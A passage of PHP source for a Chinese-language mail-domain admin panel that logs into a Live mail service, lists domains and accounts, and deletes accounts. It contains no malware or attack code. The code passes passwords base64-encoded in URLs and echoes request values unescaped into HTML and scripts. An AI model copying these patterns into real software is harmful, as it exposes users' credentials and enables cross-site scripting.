        $editor->editorMain("editor",scriptpath()."?api=editor&skin=".$skincolor,"88%","1");

        $style->footer();
        break;
}
exit;
}
?>

<?php 
function cp(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 邮箱");
$skincolor = selstyle(trim(request("skin")));

$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 

switch (trim(request("action"))){
        case "email":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("live");
}                        

                        $_SESSION["live"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))), 'authdata' => trim($AuthData));                 
                        //session_register("uname"); 
                        //$_SESSION["uname"] = "";      
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["live"]["uname"] != "" && $_SESSION["live"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["live"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["live"]["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("live");
}
                        $_SESSION["live"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))), 'authdata' => trim($AuthData));                        
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));
                                                
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode")));
                        break;
                }               
                
                $username = Base64_decode(trim(request("uname")));
                $userpwd = Base64_decode(trim(request("pwd")));

                $live_mailbox = new live_class();
                $AuthData = $live_mailbox->liveauthdatalogin($username,$userpwd);
                //echo $AuthData;
                //return;
                $TestConnect = $live_mailbox->livetestconnect($AuthData,$username,$userpwd);
        
                if ($TestConnect){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("live");
}
                        $_SESSION["live"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))), 'authdata' => trim($AuthData));                 
                        //session_register("uname"); 
                        //$_SESSION["uname"] = base64_decode(trim(request("uname")));   
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = base64_decode(trim(request("pwd")));       
                        //session_register("authdata"); 
                        //$_SESSION["authdata"] = trim($AuthData);      
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("domain.list")."&checkcode=".trim(request("checkcode"))."&authdata=".encodeuri($AuthData)."&page=".$page."&pagesize=".$pagesize);
                }
                else{
                        AlertBack("登录验证失败！" , 2);
                }
                break;
        default:
								if ($_SESSION["live"]["uname"] != "" && $_SESSION["live"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["live"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["live"]["pwd"])))."&action=".trim("email")."&checkcode=".trim(request("checkcode")));
                        break;
                }        
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=cp&action=email&skin=<?php  echo $skincolor;?>" method="post" name="live">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
               </td>
        </tr>   
</table>
<?php               
        
                break;          
}
$style->footer();
exit;
}
?>

<?php 
function live(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 邮箱");
$skincolor = selstyle(trim(request("skin")));

$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 

switch (trim(request("action"))){
        case "email":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("live");
}
                        $_SESSION["live"]=array('uname' => '', 'pwd' => '', 'authdata' => '');                 
                        //session_register("uname"); 
                        //$_SESSION["uname"] = "";      
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["live"]["uname"] != "" && $_SESSION["live"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["live"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["live"]["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("live");
}
                        $_SESSION["live"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))), 'authdata' => trim($AuthData));                        
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));
                                                
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode")));
                        break;
                }               
                
                $username = Base64_decode(trim(request("uname")));
                $userpwd = Base64_decode(trim(request("pwd")));

                $live_mailbox = new live_class();
                $AuthData = $live_mailbox->liveauthdatalogin($username,$userpwd);
                //echo $AuthData;
                //return;
                $TestConnect = $live_mailbox->livetestconnect($AuthData,$username,$userpwd);
        
                if ($TestConnect){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("live");
}
                        $_SESSION["live"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))), 'authdata' => trim($AuthData));                 
                        //session_register("uname"); 
                        //$_SESSION["uname"] = base64_decode(trim(request("uname")));   
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = base64_decode(trim(request("pwd")));       
                        //session_register("authdata"); 
                        //$_SESSION["authdata"] = trim($AuthData);      
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("domain.list")."&checkcode=".trim(request("checkcode"))."&authdata=".encodeuri($AuthData)."&page=".$page."&pagesize=".$pagesize);
                }
                else{
                        AlertBack("登录验证失败！" , 2);
                }
                break;  
        case "domain.list":
                $live_mailbox = new live_class();
                $domainlist = $live_mailbox->livedomainlist(trim($_SESSION["live"]["authdata"]),$page,$pagesize);
                //echo $_SESSION["live"]["authdata"];
                //return;
                //echo trim(request('authdata'));
                //return;
                if ($domainlist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $domainlist['length'];
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.live.chidd'+i))
 {
  eval('document.live.chidd'+i).checked = document.live.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.live.action='<?php echo ScriptPath()."?api=live&action=".encodeuri("domain.remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&authdata=".encodeuri(trim(request("authdata")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.live.submit();
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $domainlist['length'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=live&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("domain.list")."&authdata=".encodeuri(trim(request("authdata")))?>" target=_self>邮箱</a> - <?php echo base64_decode(trim(request("uname")));?> <?php if (trim(request("domainname")) != ""){echo " - ".trim(request("domainname"));} ?> <?php  if (trim($_SESSION["live"]["uname"]) != "" && trim($_SESSION["live"]["pwd"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("pwd"))))."&action=".encodeuri(trim('email'))."&logout=1"?>" target="_self">退出</a><?php  } ?>] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="live" method="post" action="">
                <?php 
                $totalitem = $domainlist['length'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=25%>
                        域名
                </td>
                <td align="center" width=15%>
                        用户数/总数
                </td>
                <td align="center" width=15%>
                        状态
                </td>
                <td align="center" width=20%>
                        搜索 可用 无效 满载
                </td> 
        </tr>
                <?php 
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        //$objHdd = $objList->item($i);
                        $domainname = $domainlist[$i]['domainname'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('domainName')->item(0)->nodeValue);
                        $domainstatus = $domainlist[$i]['domainstatus'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('active')->item(0)->nodeValue);
                        $domainnumuser = $domainlist[$i]['domainnumuser'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('numUsers')->item(0)->nodeValue);
                        $domainmaxuser = $domainlist[$i]['domainmaxuser'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        if (trim(request("searchtype"))=="disable"){
                        }       
                        elseif (trim(request("searchtype"))=="enable"){
                        }       
                        elseif (trim(request("searchtype"))=="fullload"){
                        }       
                        else{   
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.list")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=1&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">".$domainname."</a>";?>
                </td>
                <td align="center">
                        <?php echo $domainnumuser."/".$domainmaxuser;?>
                </td>
                <td align="center">
                        <?php echo $domainstatus=='true'?"可用":"无效";?>
                </td>
                <td align="center">
                        <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">添加</a>";?> 搜索 
                </td>
        </tr>   
                <?php 
                        }
                }
                ?>
                </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=live&action=".encodeuri(trim(request("action")))."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=live&action=".encodeuri(trim(request("action")))."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";
                				
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                				
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=live&action=".encodeuri(trim(request("action")))."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "account.list":
                $live_mailbox = new live_class();
                $accountlist = $live_mailbox->liveaccountlist(trim($_SESSION["live"]["authdata"]),trim(request("domainname")),$page,$pagesize);
                //print_r($accountlist);
                //return;
                //echo $_SESSION["live"]["authdata"];
                //return;
                //echo trim(request('authdata'));
                //return;
                if ($accountlist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $accountlist['length'];
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.live.chidd'+i))
 {
  eval('document.live.chidd'+i).checked = document.live.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的账号吗?')) return;
 document.live.action='<?php echo ScriptPath()."?api=live&action=".encodeuri("account.remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd"))).'&domainname='.encodeuri(trim(request("domainname")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.live.submit();
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $accountlist['length'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=live&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("domain.list")."&authdata=".encodeuri(trim(request("authdata")))?>" target=_self>邮箱</a> - <?php echo base64_decode(trim(request("uname")));?> <?php if (trim(request("domainname")) != ""){echo " - <a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("account.list")."&authdata=".encodeuri(trim(request("authdata")))."&domainname=".trim(request("domainname"))."\" target=_self>".trim(request("domainname"))."</a>";} ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="live" method="post" action="">
                <?php 
                $totalitem = $accountlist['length'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                ?>
        <tr class="tdbg">
                <td align="center" width="2%">
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width="25%">
                        用户名
                </td>
                <td align="center" width="15%">
                        <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri(trim(request("domainname")))."\">添加</a>";?> 搜索 启用 暂停 重置 <a style="color:#000000" href="javascript:delitem();">删除</a> <a style="color:#000000" href="http://mail.<?php echo trim(request("domainname"))?>/">管理</a>
                </td> 
        </tr>
                <?php 
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        $username = $accountlist[$i]['username'];
                        if (trim(request("searchtype"))=="disable"){
                        }       
                        elseif (trim(request("searchtype"))=="enable"){
                        }       
                        elseif (trim(request("searchtype"))=="fullload"){
                        }       
                        else{   
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="<?php echo $username;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.view")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&username=".encodeuri($username)."\">".$username."</a>";
                        ?>
                </td>
                <td align="center" width="15%">
                        编辑 <?php echo '<a style="color:#000000" href="'.ScriptPath().'?api=live&action='.encodeuri("account.remove").'&uname='.encodeuri(trim(request("uname"))).'&pwd='.encodeuri(trim(request("pwd"))).'&pagesize='.trim(request("pagesize")).'&page='.$page.'&skin='.$skincolor.'&domainname='.encodeuri(trim(request("domainname"))).'&username='.encodeuri($username).'&refer='.encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']).'">删除</a>';?> <?php echo '<a style="color:#000000" href="'.ScriptPath().'?api=live&action='.encodeuri("account.rename").'&uname='.encodeuri(trim(request("uname"))).'&pwd='.encodeuri(trim(request("pwd"))).'&pagesize='.trim(request("pagesize")).'&page='.$page.'&skin='.$skincolor.'&domainname='.encodeuri(trim(request("domainname"))).'&username='.encodeuri($username).'&refer='.encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']).'">改名</a>';?> 重置 暂停 改密
                </td>
        </tr>   
                <?php 
                        }
                }
                ?>
                </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=live&action=".encodeuri(trim(request("action")))."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&domainname=".encodeuri(trim(request("domainname")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=live&action=".encodeuri(trim(request("action")))."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&domainname=".encodeuri(trim(request("domainname")))."'>下一页</a> ";
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=live&action=".encodeuri(trim(request("action")))."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&domainname=".encodeuri(trim(request("domainname")))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "account.remove":
                //print_r($_POST);
                //return;
                if (trim(request("delok")) == "1"){
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>

        <script language="vbscript">
        <!--
                Dim delok
                delok = MsgBox("是否删除该账号！", vbOKCancel, "X3193")
                If delok = vbOK Or delok = vbYes Then
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1"
                else    
                        MsgBox("该账号删除取消！")
                        window.location.href="<?php echo trim(request("refer"))?>"
                End If
        //-->
        </script>
                <?php 
                        break;
                     }

                }
                $live_mailbox = new live_class();
                $accountremove = $live_mailbox->liveaccountremove(trim($_SESSION["live"]["authdata"]),trim(request("domainname")),trim(request("username")),$_POST);
                //print_r($accountremove);
                //return;
                if($accountremove['xmlcode'] == '-1' && $accountremove['msg'] == "sorry"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        邮箱账号删除失败！原因：“未选择任何条目！”<?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php       
                }       
                elseif ($accountremove['xmlcode'] == '200' && $accountremove['msg'] == "ok"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        邮箱帐号删除成功！<?php  echo $timeout/1000?> 秒后返回上一页                
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php 
                }                       
                elseif ($accountremove['xmlcode'] != '200' || $accountremove['msg'] != "ok"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        邮箱帐号删除失败,请重试！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php 
                }                       
                break;
        case "account.create":  
